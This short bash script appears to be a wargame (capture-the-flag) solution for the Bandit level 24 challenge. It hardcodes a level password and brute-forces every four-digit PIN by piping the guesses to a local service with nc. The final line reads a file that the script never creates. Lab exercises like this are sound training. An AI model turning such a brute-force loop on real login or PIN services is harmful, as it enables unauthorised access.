#!/bin/bash

# Bandit24 Password
bandit24_password='VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar'

# Preparing the input
for pin in {0000..9999}; do
    echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $pin"
done | nc localhost 30002

# Send all guesses to the daemon at once
cat guesses.txt 

